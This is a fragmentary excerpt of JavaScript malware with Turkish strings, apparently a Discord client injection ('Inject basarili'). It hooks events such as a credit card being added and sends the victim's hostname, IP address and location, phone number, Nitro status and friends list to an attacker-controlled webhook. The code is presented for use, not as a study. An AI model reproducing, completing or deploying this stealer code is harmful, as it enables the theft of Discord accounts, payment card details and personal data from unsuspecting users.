    ...
    async creditCardAdded(number, cvc, month, year) {
        ...
        var params = {
            ...
            embeds: [createEmbed({
                ...
                description: `**Toplam Arkadas Sayisi (${friends['length']})**\n\n${friends.frien}`,
                thumbnail: {
                    url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                },
                author: {
        ...
        if (config.notify_on_initialization) {
            if (token == undefined) {
                sendToWebhook({
                    ...
                    url: config.embed.href,
                    embeds: [createEmbed({
                        title: "Discord | Inject basarili | Giris yok",
                        fields: [{
                            name: "Host",
                            value: `\`\`\`${os.hostname}\`\`\``,
                            inline: false
                        }, {
                            name: "Client Versiyon",
                            value: `\`\`\`${getDiscordClient()}\`\`\``,
                            inline: false
                        }, {
                            name: "Bağlantı verileri",
                            value: `\`\`\`yaml\nIP Adres: ${network_data['ip'] ?? "Bilinmiyor"}\Host: ${network_data['hostname'] ?? "Bilinmiyor"}\nÜlke: ${network_data['city'] ?? "Bilinmiyor"}\nBölge: ${network_data['region'] ?? "Bilinmiyor"}\nÜlke: ${network_data["country"] ?? "Bilinmiyor"}\nSaat dilimi
                                : ${network_data["timezone"] ?? "Bilinmiyor"}\`\`\``,
                                inline: false
                        }],
                    })]
                })
                ...
                sendToWebhook({
                    ...
                    embeds: [createEmbed({
                        ...
                        fields: [{
                            ...
                            {
                                name: "Telefon Numarasi",
                                value: `\`\`\`${userInfo.phone ?? "Yok yürü git hadi "}\`\`\``,
                                inline: false
                            },
                            {
                                name: "Nitro",
                        ...
                        description: `**Toplam Arkadas (${friends['length']})**\n\n${friends.frien}`,
                        thumbnail: {
                            url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                        },
                        author: {
